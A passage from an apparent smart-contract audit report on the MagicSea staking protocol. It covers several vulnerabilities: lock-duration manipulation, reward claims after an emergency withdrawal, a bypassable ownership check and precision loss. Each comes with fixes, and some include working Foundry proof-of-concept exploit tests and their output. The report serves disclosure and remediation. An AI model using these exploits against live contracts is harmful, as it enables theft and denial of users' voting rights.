- Then, when the lock is 2 weeks away from expiring, the user uses `addToPosition()` and adds one wei of MLUM to their lock position.
    - From the formula, the new `lockDuration` will be `(2 weeks * 50e18 + 1 * 3 months)/(50e18 + 1)`. This is a weighted sum that is heavily skewed towards 2 weeks, so the sum evaluates to 2 weeks.
- The position now has an initial lock duration of 3 months, but [a lock duration of only 2 weeks](https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MlumStaking.sol#L414)

The user has created a lock position with `initialLockDuration` of 3 months, but a lock duration with only 2 weeks. This condition [passes all voting checks](https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/Voter.sol#L171-L177) (code comments and the code itself). The user can now continuously use `renewLockPosition` to "renew" the position, but merely extending it by 2 weeks while still gaining the full voting power (multiplier and amount) as if the position was locked for 3 months.

## Impact

Users can create a voting ballot with a duration of two weeks, which allows perpetually renewing of their voting power, effectively bypassing the three-month restriction for voting eligibility.

## Code Snippet

https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MlumStaking.sol#L410-L411

## Tool used

Manual Review

## Recommendation

`addToPosition()`'s duration modification should be reworked to disable the effect of lowering the lock duration on the votes.



## Discussion

**0xSmartContract**

Users initially lock their staking positions for 3 months and recalculate the lock period by adding a small amount of tokens 2 weeks before the lock period expires, effectively making the lock period 2 weeks. Thus, users maintain their voting authority by renewing the lock period every 2 weeks.

**0xHans1**

PR: https://github.com/sherlock-audit/2024-06-magicsea-judging/issues/138

We will use the initalLockDuration on renewLockPosition

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/metropolis-exchange/magicsea-staking/pull/5


# Issue M-14: MasterChefV2.sol :: Users are able to claim their rewards even when using emergencyWithdraw(), which breaks core functionality of the function. 

Source: https://github.com/sherlock-audit/2024-06-magicsea-judging/issues/376 

## Found by 
IvanFitro, LeFy, anonymousjoe, dhank, scammed
## Summary
**`emergencyWithdraw()`** is designed to allow users to withdraw their tokens without claiming any rewards. However, if **`_mintLUM `** is set to false, users can still claim their rewards using this function, which breacks its primary purpose.
## Vulnerability Detail
**`emergencyWithdraw()`**  is used to allow users to withdraw their tokens without claiming any rewards.
```Solidity
/**
* @dev Emergency withdraws tokens from a farm, without claiming any rewards.
* @param pid The pool ID of the farm.
*/
function emergencyWithdraw(uint256 pid) external override {
        Farm storage farm = _farms[pid];

        uint256 balance = farm.amounts.getAmountOf(msg.sender);
        int256 deltaAmount = -balance.toInt256();

        farm.amounts.update(msg.sender, deltaAmount);

        farm.token.safeTransfer(msg.sender, balance);

        emit PositionModified(pid, msg.sender, deltaAmount, 0);
    }
```
As described in the function, users who utilize this function forfeit their rewards.

**`deposit()`** calls **`_modify()`** to update an account's position on a farm and transfers the funds from the user to the contract.
```Solidity
function deposit(uint256 pid, uint256 amount) external override {
        _modify(pid, msg.sender, amount.toInt256(), false);

        if (amount > 0) _farms[pid].token.safeTransferFrom(msg.sender, address(this), amount);
    }
```
```Solidity
function _modify(uint256 pid, address account, int256 deltaAmount, bool isPayOutReward) private {
        Farm storage farm = _farms[pid];
        Rewarder.Parameter storage rewarder = farm.rewarder;
        IMasterChefRewarder extraRewarder = farm.extraRewarder;

        (uint256 oldBalance, uint256 newBalance, uint256 oldTotalSupply,) = farm.amounts.update(account, deltaAmount);

        uint256 totalLumRewardForPid = _getRewardForPid(rewarder, pid, oldTotalSupply);
   
        uint256 lumRewardForPid = _mintLum(totalLumRewardForPid);

        uint256 lumReward = rewarder.update(account, oldBalance, newBalance, oldTotalSupply, lumRewardForPid);

@>      if (isPayOutReward) {
            lumReward = lumReward + unclaimedRewards[pid][account];
            unclaimedRewards[pid][account] = 0;
            if (lumReward > 0) _lum.safeTransfer(account, lumReward);
        } else {
            unclaimedRewards[pid][account] += lumReward;
        }

        if (address(extraRewarder) != address(0)) {
            extraRewarder.onModify(account, pid, oldBalance, newBalance, oldTotalSupply);
        }

        emit PositionModified(pid, account, deltaAmount, lumReward);
    }
```
As you can see, if **`isPayOutReward`** is true, the rewards are sent to the user; if false, they are registered in the **`unclaimedRewards`** mapping.
The issue arises when **`_mintLUM`** is set to false. This parameter indicates whether the contract should mint lumTokens. If set to false, the contract must be funded with lumTokens to pay the rewards to the users and the treasury.
```Solidity
function _mintLum(uint256 amount) private returns (uint256) {
        if (amount == 0) return 0;

        (uint256 treasuryAmount, uint256 liquidityMiningAmount) = _calculateAmounts(amount);

@>      if (!_mintLUM) {
            _lum.safeTransfer(_treasury, treasuryAmount);
            return liquidityMiningAmount;
        }

        _lum.mint(_treasury, treasuryAmount);
        return _lum.mint(address(this), liquidityMiningAmount);
    }
```
The problem is that a user can claim rewards even when using **`emergencyWithdraw()`** if **`_mintLUM`** is false. Here's an example illustrating how this can happen:
1. The user deposits some tokens using **`deposit()`**.
1. After some time passes, the user deposits an amount of 0 using **`deposit()`**, registering their rewards in the **`unclaimedRewards[pid][account]`** mapping.
1. The user calls **`emergencyWithdraw()`** to recover their tokens.
1. The user calls **`claim()`** to obtain their rewards. This is possible because, in step 2, the user's rewards were saved in the mapping.

This exploit allows a user to take advantage of others. Imagine a scenario where the contract doesn't have enough funds to pay the rewards (remember, **`_mintLUM`** is false and the contract needs to be funded to pay the rewards). A user notices this and, to avoid risk, performs the previous actions to recover their funds without risk while saving their rewards for later.

This strategy allows the user to minimize risk by withdrawing their funds while still having the option to claim rewards later. This creates an unfair advantage over other users who leave their funds in the pool, trusting the system and accepting the risk. The user exploiting this strategy faces no risk, putting other users at a disadvantage.

Additionally, this issue undermines the functionality of **`emergencyWithdraw()`**. The intended purpose of **`emergencyWithdraw()`** is to allow users to withdraw their funds without claiming rewards. However, users can still claim their rewards, defeating the core purpose of the function.
## Impact
The logic of **`emergencyWithdraw()`** is completely broken.
Users can exploit this by claiming their rewards without any risk, thereby taking advantage over other users.
## POC
To set up the following POC, create a file named **`MasterChefV2.t.sol`** inside the test folder and paste the provided code. Additionally, adjust **`VoterMock.t.sol`** to ensure that the getWeight() function returns 100 to prevent transaction to revert.
```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

import "openzeppelin-contracts-upgradeable/access/OwnableUpgradeable.sol";
import "../src/transparent/TransparentUpgradeableProxy2Step.sol";

import "openzeppelin/token/ERC721/ERC721.sol";
import "openzeppelin/token/ERC20/ERC20.sol";
import "openzeppelin/token/ERC20/IERC20.sol";
import {LumMock} from "../src/mocks/LumMock.sol";
import {MasterChef} from "../src/MasterChefV2.sol";
import {MlumStaking} from "../src/MlumStaking.sol";
import "../src/Voter.sol";
import {IVoter} from "../src/interfaces/IVoter.sol";
import {VoterMock} from "./mocks/VoterMock.sol";
import {ILum} from "../src/interfaces/ILum.sol";
import {IRewarderFactory} from "../src/interfaces/IRewarderFactory.sol";
import {IMasterChefRewarder} from "../src/interfaces/IMasterChefRewarder.sol";
import {ERC20Mock} from "./mocks/ERC20.sol";


contract MasterChefV2Test is Test {

    address payable immutable DEV = payable(makeAddr("dev"));
    address payable immutable ALICE = payable(makeAddr("alice"));
    address payable immutable BOB = payable(makeAddr("bob"));
    
    address private owner;
    address private treasury;
    ILum private lumToken;
    IVoter private voter;
    IRewarderFactory private rewarderFactory;
    address private lbHooksManager;
    uint256 private treasuryShare = 0.5e18; 
    ERC20Mock private _stakingToken;
    MasterChef private masterChef;

    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");

    function setUp() public {
        owner = address(this);
        treasury = address(0x123);

        // Mock LUM token, Voter, RewarderFactory, and lbHooksManager
        lumToken = ILum(new LumMock(DEV, DEV));
        voter = IVoter(address(new VoterMock()));
        rewarderFactory = IRewarderFactory(address(123));
        lbHooksManager = address(0x456);
        
        vm.prank(DEV);
        address masterChefimplementation = address(new MasterChef(lumToken, voter, rewarderFactory, lbHooksManager, treasuryShare));

        masterChef = MasterChef(
            address(
                new TransparentUpgradeableProxy2Step(
                    masterChefimplementation, ProxyAdmin2Step(address(1)), abi.encodeWithSelector(MasterChef.initialize.selector, DEV, address(555))
                )
            )
        );

        _stakingToken = new ERC20Mock("MagicLum", "MLUM", 18);

        vm.prank(DEV);
        lumToken.grantRole(MINTER_ROLE, address(masterChef));

        vm.prank(address(masterChef));
        lumToken.mint(DEV, 100_000e18);

        //add a pid
        vm.prank(lbHooksManager);
        masterChef.add(IERC20(_stakingToken), IMasterChefRewarder(address(0)));

        vm.prank(DEV);
        masterChef.setLumPerSecond(5e18);

        vm.prank(DEV);
        masterChef.setVoter(voter);

        vm.prank(DEV);
        masterChef.setMintLum(true);

        _stakingToken.mint(address(this), 100_000e18);
        _stakingToken.mint(ALICE, 100_000e18);
        _stakingToken.mint(DEV, 100_000e18);
    }
function testEmergencyWithdraw() public {
        
        vm.prank(DEV);
        masterChef.setMintLum(false);
        vm.prank(DEV);
        lumToken.transfer(address(masterChef), 1000e18);

        _stakingToken.approve(address(masterChef), 100_000e18);

        //user deposit some tokens
        masterChef.deposit(0, 1000e18);
        
        assertEq(lumToken.balanceOf(address(this)), 0);

        uint256[] memory pid = new uint256[](1);
        pid[0] = 0;

        vm.warp(block.timestamp + 100);
        
        //deposit 0 value to register their rewards in the mapping
        masterChef.deposit(0, 0);

        //call to recover the tokens
        masterChef.emergencyWithdraw(0);
        
        vm.warp(block.timestamp + 100);
        //some time passes and user claim their rewards
        masterChef.claim(pid);

        console.log("Final Balance:", lumToken.balanceOf(address(this)));
        assertGe(lumToken.balanceOf(address(this)), 0);

    }
}
```
## Code Snippet
https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MasterchefV2.sol#L326-L337
https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MasterchefV2.sol#L539-L564
https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MasterchefV2.sol#L295-L299
https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MasterchefV2.sol#L316-L320
## Tool used
Manual Review.
## Recommendation
Ensure that **`emergencyWithdraw()`** resets **`unclaimedRewards[pid][account]`** to 0.
```diff
function emergencyWithdraw(uint256 pid) external override {
        Farm storage farm = _farms[pid];

        uint256 balance = farm.amounts.getAmountOf(msg.sender);
        int256 deltaAmount = -balance.toInt256();

        farm.amounts.update(msg.sender, deltaAmount);

        farm.token.safeTransfer(msg.sender, balance);

+       unclaimedRewards[pid][msg.sender] = 0 

        emit PositionModified(pid, msg.sender, deltaAmount, 0);
    }
```



## Discussion

**0xSmartContract**

The `emergencyWithdraw()` function is designed to allow users to withdraw their tokens without claiming the rewards. However, when the `_mintLUM` parameter is set to false, users can still claim their rewards using this function, which defeats the main purpose of the function.

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/metropolis-exchange/magicsea-staking/pull/21


# Issue M-15: Attacker can manipulate the `lockDuration` of other users positions 

Source: https://github.com/sherlock-audit/2024-06-magicsea-judging/issues/378 

## Found by 
.-..---.....-., 0uts1der, 0xAsen, 0xboriskataa, Aymen0909, BengalCatBalu, ChinmayF, Gowtham\_Ponnana, HonorLt, Honour, KupiaSec, PNS, PUSH0, PeterSR, Ryonen, Silvermist, TessKimy, Yashar, aslanbek, bbl4de, blackhole, coffiasd, dev0cloo, dhank, eLSeR17, fibonacci, gkrastenov, iamnmt, jennifer37, kmXAdam, luke, minhquanym, neogranicen, neon2835, nikhil840096, radin200, rsam\_eth, scammed, sh0velware, slowfi, t.aksoy, web3pwn, zarkk01
## Summary
The `_requireOnlyOperatorOrOwnerOf` check in `addToPosition` can be bypassed, allowing attackers to manipulate the `lockDuration` of other users positions, impacting voting eligibility and preventing users from participating in voting and earning rewards.

## Vulnerability Detail
The [`_requireOnlyOperatorOrOwnerOf`](https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MlumStaking.sol#L398) check in `addToPosition` ensures that the caller is either the owner or the operator of the tokenId:
```solidity
    function addToPosition(uint256 tokenId, uint256 amountToAdd) external override nonReentrant {
        _requireOnlyOperatorOrOwnerOf(tokenId);
```
The `_requireOnlyOperatorOrOwnerOf` function performs this verification by calling [`ERC721Upgradeable._isAuthorized`](https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MlumStaking.sol#L142) with `msg.sender` as both the `owner` and `spender`:
```solidity
    function _requireOnlyOperatorOrOwnerOf(uint256 tokenId) internal view {
        // isApprovedOrOwner: caller has no rights on token
        require(ERC721Upgradeable._isAuthorized(msg.sender, msg.sender, tokenId), "FORBIDDEN");
    }
```
Since `_isAuthorized` returns `true` when `owner == spender`, this check always evaluates to `true` regardless of the caller's identity:
```solidity
    function _isAuthorized(address owner, address spender, uint256 tokenId) internal view virtual returns (bool) {
        return
            spender != address(0) &&
            (owner == spender || isApprovedForAll(owner, spender) || _getApproved(tokenId) == spender);
    }
```
Any function implementing this check is vulnerable to bypass, but currently only `addToPosition` is affected.
An attack scenario involves an attacker manipulating the `lockDuration` of another user's position by donating a small amount (1 wei).
When users create a position, `lockDuration` dictates how long their asset is locked. This duration impacts rewards, voting eligibility, etc. If an attacker increases another user's position via `addToPosition`, the function [recalculates `lockDuration`](https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MlumStaking.sol#L409) based on new `amountToAdd` and existing lock times:
```solidity
        // we calculate the avg lock time:
        // lock_duration = (remainin_lock_time * staked_amount + amount_to_add * inital_lock_duration) / (staked_amount + amount_to_add)
        uint256 remainingLockTime = _remainingLockTime(position);
        uint256 avgDuration = (remainingLockTime * position.amount + amountToAdd * position.initialLockDuration)
            / (position.amount + amountToAdd);
```
```solidity
    function _remainingLockTime(StakingPosition memory position) internal view returns (uint256) {
        if ((position.startLockTime + position.lockDuration) <= _currentBlockTimestamp()) {
            return 0;
        }
        return (position.startLockTime + position.lockDuration) - _currentBlockTimestamp();
    }
```
A malicious user can call `addToPosition` and donate 1 wei to a position, thereby manipulating the lockDuration of that position, which will have multiple consequences for the victim.

- Alice creates a position with 100e18 as `amount` and 2 weeks as `lockDuration`.
- 1 week later the Admin starts a new voting period.
- Given that Alice's position's `lockDuration` is equal to the `PeriodDuration`, which is 2 weeks, she is eligible to participate in voting.
- Bob (a malicious actor) calls the `addToPosition` and donate 1 wei to Alice's position
- Alice's `lockDuration` is recalculated, potentially reducing it to 1 week.
- Alice calls the `vote` but her transaction reverts due to `InsufficientLockTime` error.

> **_NOTE:_**  There's no need to front-run Alice's transaction because whenever Bob performs this malicious `addToPosition`, the `lockDuration` of Alice's position will be manipulated. All that Bob needs to do is execute this action before Alice calls the vote, and it doesn't have to be immediately preceding Alice's transaction.

### Coded PoC
Above scenario is implemented in this test
Please make a file named `Ninja.t.sol` in this path: `/test/` and paste the following test code in it:
```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

import "forge-std/Test.sol";

import "../src/transparent/TransparentUpgradeableProxy2Step.sol";

import {ERC20Mock} from "./mocks/ERC20.sol";
import {MasterChefMock} from "./mocks/MasterChefMock.sol";
import {MlumStaking} from "../src/MlumStaking.sol";
import "../src/Voter.sol";
import {IVoter} from "../src/interfaces/IVoter.sol";
import "../src/interfaces/IBribeRewarder.sol";
import "../src/rewarders/BribeRewarder.sol";
import "../src/rewarders/RewarderFactory.sol";

contract Ninja is Test {
    address payable immutable DEV = payable(makeAddr("dev"));
    address payable immutable ALICE = payable(makeAddr("alice"));
    address payable immutable BOB = payable(makeAddr("bob"));

    address pool = makeAddr("pool");

    Voter private _voter;
    MlumStaking private _pool;

    ERC20Mock private _stakingToken;
    ERC20Mock private _rewardToken;
    ERC20Mock private _bribeRewardToken;

    BribeRewarder rewarder;
    RewarderFactory factory;

    function setUp() public {
        _bribeRewardToken = new ERC20Mock("Reward Token", "RT", 6);

        vm.prank(DEV);
        _stakingToken = new ERC20Mock("MagicLum", "MLUM", 18);

        vm.prank(DEV);
        _rewardToken = new ERC20Mock("USDT", "USDT", 6);

        vm.prank(DEV);
        address poolImpl = address(new MlumStaking(_stakingToken, _rewardToken));

        _pool = MlumStaking(
            address(
                new TransparentUpgradeableProxy2Step(
                    poolImpl, ProxyAdmin2Step(address(1)), abi.encodeWithSelector(MlumStaking.initialize.selector, DEV)
                )
            )
        );

        vm.prank(DEV);
        MasterChefMock mock = new MasterChefMock();

        address factoryImpl = address(new RewarderFactory());
        factory = RewarderFactory(
            address(
                new TransparentUpgradeableProxy2Step(
                    factoryImpl,
                    ProxyAdmin2Step(address(1)),
                    abi.encodeWithSelector(
                        RewarderFactory.initialize.selector, address(this), new uint8[](0), new address[](0)
                    )
                )
            )
        );
        address voterImpl = address(new Voter(mock, _pool, IRewarderFactory(address(factory))));

        _voter = Voter(
            address(
                new TransparentUpgradeableProxy2Step(
                    voterImpl, ProxyAdmin2Step(address(1)), abi.encodeWithSelector(Voter.initialize.selector, DEV)
                )
            )
        );

        factory.setRewarderImplementation(
            IRewarderFactory.RewarderType.BribeRewarder, IRewarder(address(new BribeRewarder(address(_voter))))
        );
        rewarder = BribeRewarder(payable(address(factory.createBribeRewarder(_bribeRewardToken, pool))));

        vm.prank(DEV);
        _voter.updateMinimumLockTime(2 weeks);
    }

    function test_MaliciousAddToPosition() public {
        IMlumStaking.StakingPosition memory position;

        _createPosition(ALICE, 100 ether, 2 weeks);
        assertEq(_pool.ownerOf(1), ALICE);

        _stakingToken.mint(BOB, 1 wei);

        position = _pool.getStakingPosition(1);
        assertEq(position.lockDuration, 2 weeks);
        assertEq(_remainingLockTime(position), 2 weeks);

        console.log("%s%s", "lockDuration Before Malicious addToPosition: ", position.lockDuration);

        skip(1 weeks);
        // 1 week later the Admin starts a voting period
        vm.prank(DEV);
        _voter.startNewVotingPeriod();
        assertEq(1, _voter.getCurrentVotingPeriod());

        // Alice is eligible to Vote because her position's lockDuration is = to the duration of the period
        // 2 weeks == 2 weeks
        assertEq(position.lockDuration, _voter.getPeriodDuration());

        // Bob maliciously adds 1 wei to Alice's position which will update her position and decreases her lockDuration
        vm.startPrank(BOB);
        _stakingToken.approve(address(_pool), 1 wei);
        _pool.addToPosition(1, 1 wei);
        vm.stopPrank();

        // Alice will lose her eligibility due to the lockDuration decrease that occurred after Bob maliciously added 1 wei to her position.
        // Now Alice's lockDuration is 1 week, which is less than the PeriodDuration which 2 weeks.
        position = _pool.getStakingPosition(1);
        assertLt(position.lockDuration, _voter.getPeriodDuration());
        assertEq(position.lockDuration, 1 weeks);
    
        console.log("%s%s", "lockDuration After Malicious addToPosition:  ", position.lockDuration);

        // Alice calls the vote function but her tx reverts due to the InsufficientLockTime error
        vm.prank(ALICE);
        vm.expectRevert(
            abi.encodeWithSelector(
                IVoter.IVoter__InsufficientLockTime.selector
            )
        );
        _voter.vote(1, _getDummyPools(), _getDeltaAmounts());
    }

    /*
    ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
    ||||||||||||||||||||||||| INTERNAL FUNCTIONS |||||||||||||||||||||||||||||
    ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
    */

    function _createPosition(address user, uint256 amount, uint256 duration) internal {
        _stakingToken.mint(user, 100 ether);

        vm.startPrank(user);
        _stakingToken.approve(address(_pool), amount);
        _pool.createPosition(amount, duration);
        vm.stopPrank();
    }

    function _getDeltaAmounts() internal pure returns (uint256[] memory deltaAmounts) {
        deltaAmounts = new uint256[](1);
        deltaAmounts[0] = 1e18;
    }

    function _getDummyPools() internal view returns (address[] memory pools) {
        pools = new address[](1);
        pools[0] = pool;
    }

    function _remainingLockTime(IMlumStaking.StakingPosition memory position) internal view returns (uint256) {
        if ((position.startLockTime + position.lockDuration) <= _currentBlockTimestamp()) {
            return 0;
        }
        return (position.startLockTime + position.lockDuration) - _currentBlockTimestamp();
    }

    function _currentBlockTimestamp() internal view virtual returns (uint256) {
        return block.timestamp;
    }
}
```
Run the test:
```bash
forge test --mt test_MaliciousAddToPosition -vv
```

Output:
```bash
Compiler run successful!

Ran 1 test for test/Ninja.t.sol:Ninja
[PASS] test_MaliciousAddToPosition() (gas: 624706)
Logs:
  lockDuration Before Malicious addToPosition: 1209600
  lockDuration After Malicious addToPosition:  604800

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.64ms (340.63µs CPU time)
```
## Impact
This bug has multiple impacts on rewards calculation, voting eligibility, etc., as highlighted in this report, particularly preventing users from participating in voting, thereby denying them access to rewards.

## Code Snippet
https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MlumStaking.sol#L398
https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MlumStaking.sol#L142
https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MlumStaking.sol#L409
## Tool used

Manual Review

## Recommendation
```diff
    function _requireOnlyOperatorOrOwnerOf(uint256 tokenId) internal view {
        // isApprovedOrOwner: caller has no rights on token
-       require(ERC721Upgradeable._isAuthorized(msg.sender, msg.sender, tokenId), "FORBIDDEN");
+       require(ERC721Upgradeable._isAuthorized(ownerOf(tokenId), msg.sender, tokenId), "FORBIDDEN");
    }
```



## Discussion

**0xSmartContract**

Users Can Add Amounts Instead of Each Other:
 We see that the `_requireOnlyOperatorOrOwnerOf` function always returns true using the msg.sender and msg.sender arguments, and therefore any user can add amounts to other users' staking positions.

This can lead to harm to the positions of others and lead to involuntary changes.

To solve this problem, the `_requireOnlyOperatorOrOwnerOf` function must be updated and it must be properly checked whether the caller is authorized or not.

**0xHans1**

PR: https://github.com/metropolis-exchange/magicsea-staking/pull/9

We fixed this issue already for an other audit. Basically we removed all isApprover... / requireOnlyOperator... checks and check for ownership instead. The linked PR just highlight the _checkOwnerOf function.

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/metropolis-exchange/magicsea-staking/pull/9


# Issue M-16: Funds get locked in rewarder due to precision loss 

Source: https://github.com/sherlock-audit/2024-06-magicsea-judging/issues/436 

## Found by 
4rdiii, BengalCatBalu, Honour, PNS, PeterSR, Silvermist, Smacaud, anonymousjoe, blackhole, dany.armstrong90, jennifer37, nikhil840096, pashap9990, santipu\_, slowfi, web3pwn
## Summary

Due to precision loss, funds allocated by the `BribeRewarder` are not fully distributed to the voters, resulting in some portion of the bribe getting locked within the `BribeRewarder` instance.

## Vulnerability Detail

An admin can set bribes to incentivize voting for a particular pool using `BribeRewarder`. These funds, after the voting period ends, are distributed among all voters based on the strength of their votes.

The issue arises because the bribe amount is first converted to a per-second value for the voting period and then calculated into rewards by multiplying by the time elapsed since the last reward update.

```solidity
File: magicsea-staking/src/rewarders/BribeRewarder.sol
  300:     function _calculateRewards(uint256 periodId) internal view returns (uint256) {
  301:         (uint256 startTime, uint256 endTime) = IVoter(_caller).getPeriodStartEndtime(periodId);
  302: 
  303:         if (endTime == 0 || startTime > block.timestamp) {
  304:             return 0;
  305:         }
  306: 
  307:         uint256 duration = endTime - startTime; // ~ 1209600
  308:         uint256 emissionsPerSecond = _amountPerPeriod / duration; //audit: loss of precision?
  309: 
  310:         uint256 lastUpdateTimestamp = _lastUpdateTimestamp;
  311:         uint256 timestamp = block.timestamp > endTime ? endTime : block.timestamp;
  312:         return timestamp > lastUpdateTimestamp ? (timestamp - lastUpdateTimestamp) * emissionsPerSecond : 0; //audit: loss of precision
  313:     }
```

### Proof of Concept

1. The admin sets a bribe of 1e18 for one period.
2. Alice creates a position worth 1e18 and locks it for a period of 365 days.
3. Alice votes for the period with the bribe.
4. The admin ends the voting period and starts a new one (after the standard 14 days).
5. As Alice is the only voter, the entire bribe should be allocated to her.

However, due to precision loss, not all funds are allocated correctly:

Test log:

```shell
  BribeRewarder balance: 1000000000000000000
  ALICE balance: 0
  claim
  BribeRewarder balance: 697601
  ALICE balance: 999999999999302399
```

Full test at the end of the report.

## Impact

Not all funds are distributed to voters.
A single instance of BribeRewarder is used only once to set the bribe and does not have a function to withdraw the leftovers, which means they will be locked.

The leftover amount remains locked in the `BribeRewarder` contract, resulting in:

1. Financial loss for the protocol due to locked funds.
2. Financial loss for users due to not receiving their full bribe rewards.

## Code Snippet

- [BribeRewarder.claim](https://github.com/sherlock-audit/2024-06-magicsea/blob/7fd1a65b76d50f1bf2555c699ef06cde2b646674/magicsea-staking/src/rewarders/BribeRewarder.sol#L153-L153)
- [BribeRewarder._modify](https://github.com/sherlock-audit/2024-06-magicsea/blob/7fd1a65b76d50f1bf2555c699ef06cde2b646674/magicsea-staking/src/rewarders/BribeRewarder.sol#L260-L260)
- [BribeRewarder._calculateRewards](https://github.com/sherlock-audit/2024-06-magicsea/blob/7fd1a65b76d50f1bf2555c699ef06cde2b646674/magicsea-staking/src/rewarders/BribeRewarder.sol#L300-L300)
## Tool used

Manual Review

## Recommendation

To mitigate the precision loss, change the order of operations in the `BribeRewarder._calculateRewards` function to ensure full distribution of rewards:

```diff
         uint256 duration = endTime - startTime; // ~ 1209600
-        uint256 emissionsPerSecond = _amountPerPeriod / duration; //audit: loss of precision?
 
         uint256 lastUpdateTimestamp = _lastUpdateTimestamp;
         uint256 timestamp = block.timestamp > endTime ? endTime : block.timestamp;
-        return timestamp > lastUpdateTimestamp ? (timestamp - lastUpdateTimestamp) * emissionsPerSecond : 0; //audit: loss of precision
+        return timestamp > lastUpdateTimestamp ? (timestamp - lastUpdateTimestamp) * _amountPerPeriod / duration : 0;
```

Additionally, consider using higher precision representations for the amount per period during calculations to avoid similar issues.

### Coded POC

> [!IMPORTANT]
> To run this test, a change was made to the `BribeRewarder` file to correct a permissions error reported separately.
> 
```solidity
File: magicsea-staking/src/rewarders/BribeRewarder.sol
  264: //        if (!IVoter(_caller).ownerOf(tokenId, msg.sender)) { //audit: sender can be voter if call by deposit function
  265: //            revert BribeRewarder__NotOwner();
  266: //        }

```

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/transparent/TransparentUpgradeableProxy2Step.sol";
import {MlumStaking} from "../src/MlumStaking.sol";
import {ERC20Mock} from "./mocks/ERC20.sol";
import "../src/rewarders/RewarderFactory.sol";
import "../src/rewarders/BribeRewarder.sol";
import "../src/Voter.sol";
import {MasterChefMock} from "./mocks/MasterChefMock.sol";

contract AuditTests is Test {

    address public admin = makeAddr("proxyAdmin");
    address public DEV = makeAddr("DEV");
    address public ALICE = makeAddr("ALICE");
    address public BOB = makeAddr("BOB");

    MlumStaking public stakingPool;
    RewarderFactory public rewarderFactory;
    BribeRewarder public bribeRewarder;
    Voter public voter;

    ERC20Mock public stakingToken;
    ERC20Mock public rewardToken;

    function setUp() public {
        vm.startPrank(DEV);
        stakingToken = new ERC20Mock("MagicLum", "MLUM", 18);
        rewardToken = new ERC20Mock("USDT", "USDT", 6);

        ProxyAdmin2Step proxyAdmin = new ProxyAdmin2Step(admin);

        stakingPool = MlumStaking(
            address(
                new TransparentUpgradeableProxy2Step(
                    address(new MlumStaking(stakingToken, rewardToken)),
                    proxyAdmin,
                    abi.encodeWithSelector(MlumStaking.initialize.selector, DEV)
                )
            )
        );

        rewarderFactory = RewarderFactory(
            address(
                new TransparentUpgradeableProxy2Step(
                    address(new RewarderFactory()),
                    proxyAdmin,
                    abi.encodeWithSelector(RewarderFactory.initialize.selector, DEV, new uint8[](0), new address[](0))
                )
            )
        );

        voter = Voter(
            address(
                new TransparentUpgradeableProxy2Step(
                    address(new Voter(new MasterChefMock(), stakingPool, rewarderFactory)),
                    proxyAdmin,
                    abi.encodeWithSelector(MlumStaking.initialize.selector, DEV)
                )
            )
        );

        rewarderFactory.setRewarderImplementation(
            IRewarderFactory.RewarderType.BribeRewarder, IRewarder(address(new BribeRewarder(address(voter))))
        );
        bribeRewarder = BribeRewarder(payable(address(rewarderFactory.createBribeRewarder(rewardToken, address(stakingPool)))));

    }

    function testPrecisionLost() public {
        vm.startPrank(DEV);
        rewardToken.mint(DEV, 10e18);
        rewardToken.approve(address(bribeRewarder), 10e18);
        bribeRewarder.fundAndBribe(1, 1, 1e18);

        voter.startNewVotingPeriod();
        assertEq(1, voter.getCurrentVotingPeriod());

        stakingToken.mint(ALICE, 10e18);
        vm.startPrank(ALICE);
        stakingToken.approve(address(stakingPool), 1e18);
        stakingPool.createPosition(1e18, 365 days);

        address[] memory pools = new address[](1);
        pools[0] = address(stakingPool);
        uint256[] memory deltaAmounts = new uint256[](1);
        deltaAmounts[0] = 1e18;

        voter.vote(1, pools, deltaAmounts);

        vm.startPrank(DEV);
        skip(voter.getPeriodDuration());
        voter.startNewVotingPeriod();
        assertEq(2, voter.getCurrentVotingPeriod());

        console.log('BribeRewarder balance:', rewardToken.balanceOf(address(bribeRewarder)));
        console.log('ALICE balance:', rewardToken.balanceOf(ALICE));

        console.log('claim');
        vm.startPrank(ALICE);
        bribeRewarder.claim(1);

        console.log('BribeRewarder balance:', rewardToken.balanceOf(address(bribeRewarder)));
        console.log('ALICE balance:', rewardToken.balanceOf(ALICE));
    }
}
```



## Discussion

**0xSmartContract**

Due to precision loss in the `BribeRewarder` contract, not all bribe funds are distributed to voters. This issue causes leftover funds to be locked in the contract, leading to financial loss for both the protocol and users. 
A recommended best solution involves reordering calculations to ensure full distribution of rewards and using higher precision representations.

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/metropolis-exchange/magicsea-staking/pull/24


# Issue M-17: Unclaimed rewards when emergency withdrawing are not redistributed in `MasterChef` and `MlumStaking` 

Source: https://github.com/sherlock-audit/2024-06-magicsea-judging/issues/460 

## Found by 
0xAnmol, ChinmayF, KupiaSec, Matin, iamnmt, jennifer37, neogranicen, pinalikefruit
## Summary

Unclaimed rewards when emergency withdrawing are not redistributed in `MasterChef` and `MlumStaking`.

## Vulnerability Detail

